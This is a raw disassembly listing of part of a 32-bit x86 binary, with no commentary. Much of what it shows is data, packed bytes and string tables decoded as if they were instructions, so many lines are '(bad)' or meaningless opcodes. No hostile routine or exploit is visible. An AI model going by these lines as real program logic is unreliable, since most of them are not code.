  4279a5:	cmp    edx,DWORD PTR [ecx]
  4279a7:	cmp    esp,ebx
  4279a9:	das    
  4279aa:	inc    ebp
  4279ab:	sti    
  4279ac:	xchg   edx,eax
  4279ad:	shr    ecx,cl
  4279af:	sub    BYTE PTR [edx],dl
  4279b1:	clc    
  4279b2:	add    BYTE PTR [eax-0x102c9380],0x92
  4279b9:	cmp    ebx,ebp
  4279bb:	push   ebx
  4279bc:	clc    
  4279bd:	int    0xe6
  4279bf:	mov    BYTE PTR [ebx-0x2b],dl
  4279c2:	int    0xa6
  4279c4:	dec    esp
  4279c5:	xchg   ecx,ebx
  4279c7:	sbb    esi,esp
  4279c9:	or     dl,BYTE PTR [esi+0x4cd60a88]
  4279cf:	int    0x96
  4279d1:	mov    ch,cl
  4279d3:	(bad)  
  4279d4:	dec    esp
  4279d5:	int    0xe6
  4279d7:	mov    ch,cl
  4279d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279da:	dec    esp
  4279db:	cmp    edx,DWORD PTR [ecx]
  4279dd:	cmp    esp,ebx
  4279df:	das    
  4279e0:	inc    ebp
  4279e1:	sti    
  4279e2:	xchg   edx,eax
  4279e3:	shr    ecx,cl
  4279e5:	sub    BYTE PTR [ebx],bh
  4279e7:	fst    st(3)
  4279e9:	out    dx,eax
  4279ea:	xchg   edx,eax
  4279eb:	adc    bh,al
  4279ed:	add    BYTE PTR [eax-0x2aac9380],0x53
  4279f4:	clc    
  4279f5:	ds xchg esi,eax
  4279f7:	xor    BYTE PTR [esi],bl
  4279f9:	(bad)  
  4279fa:	adc    al,0xcd
  4279fc:	xchg   esi,eax
  4279fd:	cmp    al,0xcd
  4279ff:	(bad)  
  427a00:	inc    esp
  427a01:	int    0x96
  427a03:	xor    ch,cl
  427a05:	(bad)  
  427a06:	adc    al,0xcd
  427a08:	xchg   esi,eax
  427a09:	xor    ch,cl
  427a0b:	(bad)  
  427a0c:	adc    al,0xcd
  427a0e:	out    0x30,al
  427a10:	int    0xa6
  427a12:	adc    al,0x3b
  427a14:	adc    DWORD PTR [ebx],edi
  427a16:	jecxz  0x427a47
  427a18:	inc    ebp
  427a19:	sti    
  427a1a:	xchg   edx,eax
  427a1b:	shr    ecx,cl
  427a1d:	sub    BYTE PTR [ebx],bh
  427a1f:	fst    QWORD PTR [edx]
  427a21:	clc    
  427a22:	add    BYTE PTR [eax-0x102c9380],0x92
  427a29:	push   ebx
  427a2a:	clc    
  427a2b:	int    0xe6
  427a2d:	cmp    al,0x53
  427a2f:	aad    0xcd
  427a31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a32:	inc    esp
  427a33:	cmp    edi,edx
  427a35:	cmp    ebx,DWORD PTR [ebp-0x32c38933]
  427a3b:	lea    eax,[edi+ebp*1+0x45]
  427a3f:	loope  0x4279d3
  427a41:	cmp    ecx,ebx
  427a43:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427a49:	sub    BYTE PTR [ebx+edx*2-0x6],0xcd
  427a4e:	lea    esi,[eax]
  427a50:	shr    esp,cl
  427a52:	xchg   edx,eax
  427a53:	push   ebx
  427a54:	popf   
  427a55:	xchg   ecx,ebx
  427a57:	int    0x96
  427a59:	adc    al,0x1b
  427a5b:	hlt    
  427a5c:	add    al,0xf2
  427a5e:	std    
  427a5f:	shr    edi,cl
  427a61:	sub    BYTE PTR [ebx],bh
  427a63:	ins    DWORD PTR es:[edi],dx
  427a64:	adc    al,BYTE PTR [edx]
  427a66:	aam    0x37
  427a68:	ficom  WORD PTR [ebx]
  427a6a:	adc    bh,bl
  427a6c:	mov    ebp,0xcd25230a
  427a71:	out    0x3c,al
  427a73:	int    0xa6
  427a75:	inc    esp
  427a76:	add    al,0xe9
  427a78:	std    
  427a79:	adc    bh,al
  427a7b:	aam    0x37
  427a7d:	ficom  WORD PTR [ebx]
  427a7f:	adc    dh,ah
  427a81:	mov    ebp,0x8725230a
  427a86:	lock int 0xe6
  427a89:	and    al,0x1b
  427a8b:	aad    0x53
  427a8d:	rcl    BYTE PTR [esi-0x43],cl
  427a90:	or     ah,BYTE PTR [ebx]
  427a92:	and    eax,0x12025370
  427a97:	not    esi
  427a99:	aaa    
  427a9a:	ficom  WORD PTR [ebx]
  427a9c:	cwde   
  427a9d:	add    dh,dl
  427a9f:	xor    al,0x0
  427aa1:	(bad)  
  427aa2:	sub    al,0x9a
  427aa4:	add    dh,dl
  427aa6:	sbb    al,0x0
  427aa8:	(bad)  
  427aa9:	adc    al,0x0
  427aab:	(bad)  
  427aac:	xor    BYTE PTR [eax],al
  427aae:	(bad)  
  427aaf:	dec    esp
  427ab0:	add    dh,dl
  427ab2:	mov    BYTE PTR [ebp+0xfef4],bh
  427ab8:	or     cl,BYTE PTR [ebx-0x57557433]
  427abe:	arpl   bx,cx
  427ac0:	sar    BYTE PTR [eax+eax*4],cl
  427ac3:	int    0x96
  427ac5:	mov    ch,cl
  427ac7:	(bad)  
  427ac8:	dec    esp
  427ac9:	int    0xe6
  427acb:	mov    ch,cl
  427acd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ace:	dec    esp
  427acf:	cmp    esp,ebx
  427ad1:	cmp    edx,DWORD PTR [ecx]
  427ad3:	das    
  427ad4:	inc    ebp
  427ad5:	sti    
  427ad6:	xchg   edx,eax
  427ad7:	shr    ecx,cl
  427ad9:	sub    BYTE PTR [edx],dl
  427adb:	clc    
  427adc:	add    BYTE PTR [eax-0x102c9380],0x92
  427ae3:	cmp    ebx,ebp
  427ae5:	push   ebx
  427ae6:	aad    0x53
  427ae8:	clc    
  427ae9:	int    0xe6
  427aeb:	xor    ch,cl
  427aed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427aee:	adc    al,0x53
  427af0:	fst    DWORD PTR [ebx-0xc]
  427af3:	or     dl,BYTE PTR [esi+0x14d60a30]
  427af9:	int    0x96
  427afb:	cmp    al,0xcd
  427afd:	(bad)  
  427afe:	inc    esp
  427aff:	int    0x96
  427b01:	xor    ch,cl
  427b03:	(bad)  
  427b04:	adc    al,0xcd
  427b06:	xchg   esi,eax
  427b07:	mov    ch,cl
  427b09:	(bad)  
  427b0a:	dec    esp
  427b0b:	int    0x96
  427b0d:	mov    ch,cl
  427b0f:	(bad)  
  427b10:	dec    esp
  427b11:	int    0xe6
  427b13:	mov    ch,cl
  427b15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b16:	dec    esp
  427b17:	cmp    esp,ebx
  427b19:	cmp    edx,DWORD PTR [ecx]
  427b1b:	das    
  427b1c:	inc    ebp
  427b1d:	sti    
  427b1e:	xchg   edx,eax
  427b1f:	shr    ecx,cl
  427b21:	sub    BYTE PTR [edx],dl
  427b23:	clc    
  427b24:	add    BYTE PTR [eax-0x22c49380],0x53
  427b2b:	aad    0xd3
  427b2d:	out    dx,eax
  427b2e:	xchg   edx,eax
  427b2f:	push   ebx
  427b30:	clc    
  427b31:	int    0xe6
  427b33:	xor    ch,cl
  427b35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b36:	adc    al,0x3b
  427b38:	cli    
  427b39:	cmp    ebx,DWORD PTR [ebp-0x32cf8933]
  427b3f:	lea    edx,[edi+ebp*1]
  427b42:	inc    ebp
  427b43:	loope  0x427ad7
  427b45:	cmp    ecx,ebx
  427b47:	push   ebx
  427b48:	cli    
  427b49:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427b4f:	sub    BYTE PTR [ebx+edx*8-0x14],0x92
  427b54:	push   ebx
  427b55:	popf   
  427b56:	int    0x76
  427b58:	cmp    al,0xcd
  427b5a:	lea    eax,[edi+eax*4-0x27]
  427b5e:	int    0xe6
  427b60:	cmp    al,0x1b
  427b62:	hlt    
  427b63:	int    0xa6
  427b65:	inc    esp
  427b66:	adc    al,BYTE PTR [edx]
  427b68:	mov    ebp,0x5625230a
  427b6d:	jnp    0x427ba6
  427b6f:	ficom  WORD PTR [ebx]
  427b71:	das    
  427b72:	inc    ebp
  427b73:	jge    0x427b07
  427b75:	shr    ecx,cl
  427b77:	sub    bl,dl
  427b79:	jmp    0x427b0d
  427b7b:	cmp    ebx,ebp
  427b7d:	adc    bh,al
  427b7f:	add    BYTE PTR [eax-0xfac9380],0x53
  427b86:	lds    eax,FWORD PTR [edi-0x32fde40f]
  427b8c:	lea    ecx,[eax-0x32b36933]
  427b92:	out    0x30,al
  427b94:	int    0xa6
  427b96:	adc    al,0x4
  427b98:	repnz std 
  427b9a:	add    al,0xe9
  427b9c:	std    
  427b9d:	adc    al,BYTE PTR [edx]
  427b9f:	aam    0x37
  427ba1:	ficom  WORD PTR [ebx]
  427ba3:	adc    bh,al
  427ba5:	aam    0x37
  427ba7:	ficom  WORD PTR [ebx]
  427ba9:	shr    edi,cl
  427bab:	sub    BYTE PTR [ebx],bh
  427bad:	ins    DWORD PTR es:[edi],dx
  427bae:	adc    bh,bl
  427bb0:	mov    ebp,0x1225230a
  427bb5:	hlt    
  427bb6:	mov    ebp,0x8725230a
  427bbb:	lock sbb edx,ebp
  427bbe:	jmp    0x427c07
  427bc0:	inc    DWORD PTR [eax]
  427bc2:	add    BYTE PTR [esi-0x12fb1233],dl
  427bc8:	sbb    al,0x98
  427bca:	pop    edi
  427bcb:	(bad)  
  427bcc:	aaa    
  427bcd:	ficom  WORD PTR [ebx]
  427bcf:	or     cl,BYTE PTR [ebp+0xabd5d11]
  427bd5:	and    esp,DWORD PTR ds:0xc9f5760a
  427bdb:	jbe    0x427b9a
  427bdd:	xchg   ecx,eax
  427bde:	aaa    
  427bdf:	ficom  WORD PTR [ebx]
  427be1:	or     dh,BYTE PTR [esi-0x13]
  427be4:	int    0x96
  427be6:	adc    ebp,ecx
  427be8:	(bad)  
  427be9:	cmc    
  427bea:	call   0xefd3:0x92fb452f
  427bf1:	xchg   edx,eax
  427bf2:	int    0xd6
  427bf4:	adc    ebp,ecx
  427bf6:	out    0xf5,al
  427bf8:	jo     0x427c0c
  427bfa:	sti    
  427bfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427bfc:	mov    esi,0x3b4229
  427c01:	jno    0x427c56
  427c03:	(bad)  [edx]
  427c05:	xchg   esi,eax
  427c06:	std    
  427c07:	int    0x96
  427c09:	dec    esp
  427c0a:	or     dl,BYTE PTR [esi+0x4cd6004c]
  427c10:	iret   
  427c11:	jbe    0x427c10
  427c13:	add    dh,dl
  427c15:	mov    bl,dl
  427c17:	mov    ecx,0xd6007028
  427c1c:	dec    esp
  427c1d:	add    dh,dl
  427c1f:	in     eax,dx
  427c20:	add    dh,dl
  427c22:	mov    ebp,0xf5d600
  427c27:	(bad)  
  427c28:	adc    DWORD PTR [ebp+0xfde6],edi
  427c2e:	stos   BYTE PTR es:[edi],al
  427c2f:	or     dh,BYTE PTR [esi-0x3]
  427c32:	int    0x76
  427c34:	std    
  427c35:	test   al,0xcb
  427c37:	ror    BYTE PTR [eax-0x12326980],cl
  427c3d:	add    al,0xb5
  427c3f:	stc    
  427c40:	add    al,0xed
  427c42:	inc    esp
  427c43:	cwde   
  427c44:	leave  
  427c45:	je     0x427c7b
  427c47:	xor    al,0x80
  427c49:	add    BYTE PTR [eax+0x3474c980],0x44
  427c50:	add    BYTE PTR [eax+0x74cf8080],0x34
  427c57:	xor    BYTE PTR [eax+0x0],dh
  427c5a:	(bad)  
  427c5b:	xor    al,0x0
  427c5d:	(bad)  
  427c5e:	sub    al,0x0
  427c60:	(bad)  
  427c61:	and    al,0x0
  427c63:	(bad)  
  427c64:	sbb    al,0x0
  427c66:	(bad)  
  427c67:	adc    al,0x0
  427c69:	(bad)  
  427c6a:	xor    BYTE PTR [eax],al
  427c6c:	(bad)  
  427c6d:	dec    esp
  427c6e:	add    dh,dl
  427c70:	mov    BYTE PTR [ebp+0xe7e7],bh
  427c76:	int    0x76
  427c78:	mov    BYTE PTR [edx],cl
  427c7a:	je     0x427cb0
  427c7c:	test   ch,cl
  427c7e:	je     0x427cb4
  427c80:	xor    al,0x6
  427c82:	ins    DWORD PTR es:[edi],dx
  427c83:	das    
  427c84:	add    eax,0x80808017
  427c89:	int    0x74
  427c8b:	xor    al,0x44
  427c8d:	push   es
  427c8e:	ins    DWORD PTR es:[edi],dx
  427c8f:	das    
  427c90:	add    eax,0x8080800a
  427c95:	add    ah,dl
  427c97:	xor    al,0x24
  427c99:	add    ah,dl
  427c9b:	xor    al,0x24
  427c9d:	add    ah,dl
  427c9f:	xor    al,0x24
  427ca1:	int    0x74
  427ca3:	xor    al,0x50
  427ca5:	add    cl,dh
  427ca7:	int    0x74
  427ca9:	xor    al,0x84
  427cab:	int    0x74
  427cad:	xor    al,0x84
  427caf:	int    0x74
  427cb1:	xor    al,0x84
  427cb3:	iret   
  427cb4:	jbe    0x427c3a
  427cb6:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427cba:	int    0x74
  427cbc:	xor    al,0x3c
  427cbe:	xchg   DWORD PTR [esp+esi*1-0x7c],esi
  427cc2:	or     dh,BYTE PTR [esp+esi*1-0x7c]
  427cc6:	int    0x74
  427cc8:	xor    al,0x84
  427cca:	int    0x74
  427ccc:	xor    al,0x84
  427cce:	int    0x8c
  427cd0:	xor    al,0x84
  427cd2:	int    0xa
  427cd4:	and    eax,0xcd808081
  427cd9:	xor    ebp,ecx
  427cdb:	aam    0x34
  427cdd:	mov    ch,cl
  427cdf:	add    DWORD PTR ds:0x5e808081,ebp
  427ce5:	sbb    BYTE PTR [edi],ch
  427ce7:	or     edx,DWORD PTR ds:0xcd808081
  427ced:	xor    ch,cl
  427cef:	push   eax
  427cf0:	int    0x62
  427cf2:	fs iret 
  427cf4:	xchg   esp,eax
  427cf5:	sbb    BYTE PTR [eax-0x33],dh
  427cf8:	push   ecx
  427cf9:	int    0x22
  427cfb:	xchg   DWORD PTR [ecx-0x77cb2b33],ebx
  427d01:	pop    esi
  427d02:	sbb    BYTE PTR [edi],ch
  427d04:	add    al,0x7b
  427d06:	add    DWORD PTR [eax+0x3494cd80],0xcd51cd88
  427d10:	dec    edx
  427d11:	int    0x80
  427d13:	xor    ecx,DWORD PTR [edi]
  427d15:	xchg   ebx,edx
  427d17:	or     dl,BYTE PTR [edx-0x7f7e8d15]
  427d1d:	or     ch,0x74
  427d20:	xor    al,0x44
  427d22:	push   es
  427d23:	ins    DWORD PTR es:[edi],dx
  427d24:	das    
  427d25:	push   es
  427d26:	cwde   
  427d27:	add    DWORD PTR [eax+0x3474cd80],0x2d01cd84
  427d31:	add    DWORD PTR [eax+0xa80cd80],0xcd4c3474
  427d3b:	je     0x427d71
  427d3d:	test   ch,cl
  427d3f:	add    DWORD PTR ds:0xcd808081,esp
  427d45:	or     BYTE PTR [edx],0x74
  427d48:	xor    al,0x4c
  427d4a:	int    0x74
  427d4c:	xor    al,0x84
  427d4e:	int    0x1
  427d50:	or     DWORD PTR [ecx-0x7f327f80],eax
  427d56:	int    0x80
  427d58:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427d5c:	int    0x74
  427d5e:	xor    al,0x84
  427d60:	int    0x1
  427d62:	int3   
  427d63:	add    DWORD PTR [eax-0x327f3280],0x34740a80
  427d6d:	dec    esp
  427d6e:	int    0x74
  427d70:	xor    al,0x84
  427d72:	int    0x8c
  427d74:	xor    al,0x84
  427d76:	int    0x1
  427d78:	popf   
  427d79:	add    DWORD PTR [eax-0x62f53280],0xcd808081
  427d83:	or     ch,0x89
  427d86:	imul   edx,ecx,0x3b358621
  427d8c:	jns    0x427d92
  427d8e:	add    bh,bh
  427d90:	sar    DWORD PTR [ebp+0x28f2d392],cl
  427d96:	push   ebx
  427d97:	jge    0x427da3
  427d99:	mov    WORD PTR [esp+ecx*2],?
  427d9c:	leave  
  427d9d:	je     0x427dd3
  427d9f:	mov    BYTE PTR [eax-0x327f7f80],al
  427da5:	je     0x427ddb
  427da7:	xor    al,0x6
  427da9:	ins    DWORD PTR es:[edi],dx
  427daa:	aam    0x73
  427dac:	int    0x74
  427dae:	xor    al,0x30
  427db0:	add    al,0xbd
  427db2:	adc    ah,0x52
  427db5:	jl     0x427d8b
  427db7:	cmp    edi,DWORD PTR [esp+edi*2-0x2c]
  427dbb:	and    edi,DWORD PTR [esi+edx*8+0x52]
  427dbf:	add    ah,dl
  427dc1:	xor    al,0x2c
  427dc3:	add    ah,dl
  427dc5:	xor    al,0x2c
  427dc7:	add    ah,dl
  427dc9:	xor    al,0x2c
  427dcb:	add    ah,dl
  427dcd:	xor    al,0x2c
  427dcf:	int    0x74
  427dd1:	xor    al,0x54
  427dd3:	add    cl,dh
  427dd5:	in     al,dx
  427dd6:	cmp    BYTE PTR [eax],al
  427dd8:	aam    0x34
  427dda:	and    al,0x0
  427ddc:	aam    0x34
  427dde:	and    al,0x0
  427de0:	aam    0x34
  427de2:	and    al,0xcd
  427de4:	je     0x427e1a
  427de6:	push   eax
  427de7:	add    cl,dh
  427de9:	in     al,dx
  427dea:	and    al,BYTE PTR [eax]
  427dec:	aam    0x34
  427dee:	adc    al,0xcd
  427df0:	je     0x427e26
  427df2:	cmp    al,0x0
  427df4:	icebp  
  427df5:	in     al,dx
  427df6:	xchg   ch,cl
  427df8:	je     0x427e2e
  427dfa:	xor    al,0x0
  427dfc:	icebp  
  427dfd:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427e01:	int    0x74
  427e03:	xor    al,0x4c
  427e05:	push   es
  427e06:	ins    DWORD PTR es:[edi],dx
  427e07:	aam    0x4e
  427e09:	int    0x74
  427e0b:	xor    al,0x84
  427e0d:	leave  
  427e0e:	add    DWORD PTR [ebp+0x41808081],ebp
  427e14:	and    DWORD PTR [esi+0x3474cd35],eax
  427e1a:	mov    ch,cl
  427e1c:	mov    WORD PTR [esp+eax*4],?
  427e1f:	int    0xa
  427e21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e22:	add    DWORD PTR [eax-0x367ef580],0x49883474
  427e2c:	and    DWORD PTR [esi+0x3474cd35],eax
  427e32:	mov    ch,cl
  427e34:	mov    WORD PTR [eax+ecx*4],?
  427e37:	cmp    edi,DWORD PTR [ecx+0x4]
  427e3a:	add    bh,bh
  427e3c:	shl    edx,cl
  427e3e:	sub    bl,dl
  427e40:	mov    ebp,0xcdd35392
  427e45:	mov    WORD PTR [esp+ecx*2],?
  427e48:	inc    ebx
  427e49:	rcl    esi,cl
  427e4b:	and    ecx,ebp
  427e4d:	je     0x427e83
  427e4f:	test   ch,cl
  427e51:	mov    WORD PTR [esp+eax*4],?
  427e54:	int    0xa
  427e56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e57:	add    DWORD PTR [eax-0x32aeff80],0x80811101
  427e61:	add    BYTE PTR [eax],0x70
  427e64:	cmp    al,0xec
  427e66:	push   ds
  427e67:	iret   
  427e68:	jbe    0x427dee
  427e6a:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427e6e:	int    0x74
  427e70:	xor    al,0x4c
  427e72:	int    0x8c
  427e74:	xor    al,0x84
  427e76:	int    0xa
  427e78:	in     al,0x81
  427e7a:	add    BYTE PTR [eax-0x777e7633],0xcd
  427e81:	je     0x427eb7
  427e83:	test   ch,cl
  427e85:	add    ebp,ebp
  427e87:	add    DWORD PTR [eax-0x3277ff80],0xcd84348c
  427e91:	or     bh,BYTE PTR [ebp-0x327f7f7f]
  427e97:	or     bh,0x84
  427e9a:	adc    cl,ch
  427e9c:	mov    WORD PTR [esp+eax*4],?
  427e9f:	int    0xa
  427ea1:	in     al,0x81
  427ea3:	add    BYTE PTR [eax-0x76327f33],0x81
  427eaa:	mov    BYTE PTR [eax-0x2d591833],ch
  427eb0:	sub    al,0x80
  427eb2:	lds    edx,FWORD PTR [eax+0x75]
  427eb5:	ins    BYTE PTR es:[edi],dx
  427eb6:	jae    0x427f2f
  427eb8:	bound  ebp,QWORD PTR gs:[edi+0x6c]
  427ebc:	bound  esp,QWORD PTR fs:[ebp+0x64]
  427ec0:	add    BYTE PTR [ecx+0x74],ah
  427ec3:	ins    BYTE PTR es:[edi],dx
  427ec4:	popa   
  427ec5:	inc    esp
  427ec6:	gs popa 
  427ec8:	fs push 0x6561686d
  427ece:	add    BYTE PTR fs:[ebp+0x74],ah
  427ed2:	push   0x65726143
  427ed7:	outs   dx,DWORD PTR ds:[esi]
  427ed8:	jns    0x427f40
  427eda:	add    BYTE PTR gs:[edi+0x72],dh
  427ede:	jns    0x427f4d
  427ee0:	popa   
  427ee1:	outs   dx,DWORD PTR ds:[esi]
  427ee2:	bound  ebp,QWORD PTR gs:[ecx+0x74]
  427ee6:	add    BYTE PTR [edi+ebp*2+0x73],dh
  427eea:	push   0x6f6d6568
  427eef:	add    BYTE PTR fs:[edx+0x65],dl
  427ef3:	arpl   WORD PTR [ebx+0x62],si
  427ef6:	popa   
  427ef7:	ins    BYTE PTR es:[edi],dx
  427ef8:	jne    0x427f72
  427efa:	gs jae 0x427efd
  427efd:	ins    DWORD PTR es:[edi],dx
  427efe:	imul   edi,DWORD PTR [eax+0x50],0x64726569
  427f05:	outs   dx,DWORD PTR ds:[esi]
  427f06:	jb     0x427f77
  427f08:	jo     0x427f0a
  427f0a:	ja     0x427f6d
  427f0c:	gs je  0x427f7e
  427f0f:	jb     0x427f80
  427f11:	bound  esp,QWORD PTR [ecx+0x70]
  427f14:	add    BYTE PTR [ebx+0x69],cl
  427f17:	outs   dx,BYTE PTR ds:[esi]
  427f18:	addr16 addr16 popa 
  427f1b:	outs   dx,BYTE PTR ds:[esi]
  427f1c:	arpl   WORD PTR [ecx+0x70],sp
  427f1f:	add    BYTE PTR [edi+0x6e],al
  427f22:	jne    0x427f97
  427f24:	je     0x427f8b
  427f26:	outs   dx,BYTE PTR ds:[esi]
  427f27:	push   esi
  427f28:	popa   
  427f29:	jb     0x427fa4
  427f2b:	add    BYTE PTR [ebx+esi*2+0x61],dl
  427f2f:	jb     0x427f81
  427f31:	popa   
  427f32:	ins    BYTE PTR es:[edi],dx
  427f33:	ins    DWORD PTR es:[edi],dx
  427f34:	je     0x427f9f
  427f36:	outs   dx,DWORD PTR ds:[esi]
  427f37:	ja     0x427f9e
  427f39:	jb     0x427f3b
  427f3b:	jo     0x427fa2
  427f3d:	ins    DWORD PTR es:[edi],dx
  427f3e:	jns    0x427fb4
  427f40:	push   0x6f656562
  427f45:	outs   dx,BYTE PTR ds:[esi]
  427f46:	push   eax
  427f47:	imul   esi,DWORD PTR [eax+0x79],0x786f6200
  427f4e:	inc    ebx
  427f4f:	outs   dx,DWORD PTR ds:[esi]
  427f50:	popa   
  427f51:	ins    BYTE PTR es:[edi],dx
  427f52:	popa   
  427f53:	imul   ebp,DWORD PTR [eax+0x65],0x656573
  427f5a:	je     0x427fd5
  427f5c:	outs   dx,DWORD PTR gs:[esi]
  427f5e:	outs   dx,BYTE PTR ds:[esi]
  427f5f:	gs ins BYTE PTR es:[edi],dx
  427f61:	inc    ebx
  427f62:	push   0x54007261
  427f67:	jns    0x427fd9
  427f69:	jns    0x427fd8
  427f6b:	jne    0x427fd2
  427f6d:	imul   eax,DWORD PTR gs:[eax],0x70
  427f71:	outs   dx,DWORD PTR ds:[esi]
  427f72:	je     0x427fb6
  427f74:	gs gs jb 0x427fe8
  427f78:	outs   dx,DWORD PTR ds:[esi]
  427f79:	je     0x427fe6
  427f7b:	imul   eax,DWORD PTR [eax],0x616c7548
  427f81:	jo     0x427fec
  427f83:	popa   
  427f84:	ins    BYTE PTR es:[edi],dx
  427f85:	dec    ebx
  427f86:	outs   dx,BYTE PTR ds:[esi]
  427f87:	popa   
  427f88:	jo     0x428003
  427f8a:	add    BYTE PTR gs:[eax+0x6f],dh
  427f8e:	je     0x427fd2
  427f90:	gs ins BYTE PTR es:[edi],dx
  427f92:	jae    0x428003
  427f94:	js     0x427f96
  427f96:	popa   
  427f97:	data16 je 0x427fe0
  427f9a:	ins    BYTE PTR es:[edi],dx
  427f9b:	popa   
  427f9c:	imul   esp,DWORD PTR [ebp+0x78],0x70
  427fa0:	gs jae 0x428004
  427fa3:	jb     0x427fa5
  427fa5:	inc    edx
  427fa6:	ins    BYTE PTR es:[edi],dx
  427fa7:	popa   
  427fa8:	bound  eax,QWORD PTR [ecx+ebp*2+0x6e]
  427fac:	je     0x428014
  427fae:	ins    BYTE PTR es:[edi],dx
  427faf:	jns    0x428026
  427fb1:	push   0x6d6d6800
  427fb6:	popa   
  427fb7:	inc    edi
  427fb8:	popa   
  427fb9:	ins    BYTE PTR es:[edi],dx
  427fba:	ins    BYTE PTR es:[edi],dx
  427fbb:	push   0x48007361
  427fc0:	outs   dx,DWORD PTR ds:[esi]
  427fc1:	ins    DWORD PTR es:[edi],dx
  427fc2:	outs   dx,DWORD PTR gs:[esi]
  427fc4:	jb     0x42802b
  427fc6:	data16 jno 0x428032
  427fc9:	jae    0x42802c
  427fcb:	bound  esi,QWORD PTR [eax+0x61]
  427fce:	add    BYTE PTR [ebp+0x74],ah
  427fd1:	outs   dx,BYTE PTR ds:[esi]
  427fd2:	gs addr16 jbe 0x428037
  427fd6:	je     0x428051
  427fd8:	gs popa 
  427fda:	add    BYTE PTR [ebp+0x67],ah
  427fdd:	outs   dx,DWORD PTR ds:[esi]
  427fde:	inc    edi
  427fdf:	popa   
  427fe0:	imul   esi,DWORD PTR [ecx+eiz*2+0x72],0x6f00656f
  427fe8:	jo     0x42804f
  427fea:	fs jbe 0x42804e
  427fed:	je     0x428064
  427fef:	imul   ebp,DWORD PTR [ecx+0x66],0x62
  427ff3:	outs   dx,DWORD PTR ds:[esi]
  427ff4:	add    BYTE PTR [edx+0x0],ch
  427ff7:	jne    0x427ff9
  427ff9:	add    BYTE PTR [bp+0x0],ch
  427ffd:	popa   
  427ffe:	add    BYTE PTR [esi+0x0],ch
  428001:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  428006:	add    BYTE PTR [ebp+0x0],dh
  428009:	ins    DWORD PTR es:[edi],dx
  42800a:	add    BYTE PTR [eax],al
  42800c:	add    BYTE PTR [edi+0x0],ch
  42800f:	jb     0x428011
  428011:	ja     0x428013
  428013:	imul   eax,DWORD PTR [eax],0x680073
  428019:	outs   dx,BYTE PTR ds:[esi]
  42801a:	add    BYTE PTR [ecx+0x0],ch
  42801d:	add    BYTE PTR fs:[ecx+0x0],ch
  428021:	ja     0x428023
  428023:	imul   eax,DWORD PTR [eax],0x65006e
  428029:	push   0x70000000
  42802e:	add    BYTE PTR [ecx+0x0],ah
  428031:	je     0x428033
  428033:	jbe    0x428035
  428035:	add    BYTE PTR gs:[ebp+0x0],ah
  428039:	je     0x42803b
  42803b:	add    BYTE PTR gs:[edi+0x0],ah
  42803f:	ins    BYTE PTR es:[edi],dx
  428040:	add    BYTE PTR [ecx+0x0],ah
  428043:	imul   eax,DWORD PTR [eax],0x66
  428049:	outs   dx,DWORD PTR ds:[esi]
  42804a:	add    BYTE PTR [esi+0x0],ch
  42804d:	je     0x42804f
  42804f:	popa   
  428050:	add    BYTE PTR [edi+0x0],dh
  428053:	push   ebx
  428054:	add    BYTE PTR [edi+0x0],ch
  428057:	arpl   WORD PTR [eax],ax
  428059:	imul   eax,DWORD PTR [eax],0x61
  42805c:	add    BYTE PTR [esi+0x0],dh
  42805f:	outs   dx,DWORD PTR ds:[esi]
  428060:	add    BYTE PTR [eax],al
  428062:	add    BYTE PTR [ebp+0x0],ch
  428065:	jns    0x428067
  428067:	add    BYTE PTR gs:[esi+0x0],ah
  42806b:	ins    BYTE PTR es:[edi],dx
  42806c:	add    BYTE PTR [ecx+0x0],ah
  42806f:	jns    0x428071
  428071:	jbe    0x428073
  428073:	popa   
  428074:	add    BYTE PTR [esi+0x0],ch
  428077:	popa   
  428078:	add    BYTE PTR [edi+0x0],ah
  42807b:	outs   dx,DWORD PTR ds:[esi]
  42807c:	add    BYTE PTR [eax],al
  42807e:	add    BYTE PTR [edi+0x0],ch
  428081:	jb     0x428083
  428083:	jae    0x428085
  428085:	imul   eax,DWORD PTR [eax],0x47006e
  42808b:	imul   eax,DWORD PTR [eax],0x70006d
  428091:	bound  eax,QWORD PTR [eax]
  428093:	outs   dx,DWORD PTR ds:[esi]
  428094:	add    BYTE PTR [eax+0x0],dh
  428097:	imul   eax,DWORD PTR [eax],0x650000
  42809d:	js     0x42809f
  42809f:	jae    0x4280a1
  4280a1:	outs   dx,DWORD PTR ds:[esi]
  4280a2:	add    BYTE PTR [ebx+0x0],dh
  4280a5:	popa   
  4280a6:	add    BYTE PTR [esi+0x0],ch
  4280a9:	je     0x4280ab
  4280ab:	add    BYTE PTR [eax],al
  4280ad:	bound  eax,QWORD PTR [eax]
  4280af:	jns    0x4280b1
  4280b1:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  4280b6:	add    BYTE PTR [eax+eax*1+0x74],ah
  4280ba:	add    BYTE PTR [ecx+0x0],ah
  4280bd:	add    BYTE PTR [eax],al
  4280bf:	js     0x4280c1
  4280c1:	imul   eax,DWORD PTR [eax],0x610054
  4280c7:	imul   eax,DWORD PTR [eax],0x48006e
  4280cd:	popa   
  4280ce:	add    BYTE PTR [esi+0x0],ch
  4280d1:	add    BYTE PTR fs:[eax],al
  4280d4:	add    BYTE PTR [edi+0x0],cl
  4280d7:	ja     0x4280d9
  4280d9:	ins    BYTE PTR es:[edi],dx
  4280da:	add    BYTE PTR [ebx+0x0],dh
  4280dd:	popa   
  4280de:	add    BYTE PTR [ebx+0x0],dh
  4280e1:	jo     0x4280e3
  4280e3:	popa   
  4280e4:	add    BYTE PTR [ecx+0x0],ch
  4280e7:	imul   eax,DWORD PTR [eax],0x72
  4280ea:	add    BYTE PTR [ebp+0x0],ah
  4280ed:	jbe    0x4280ef
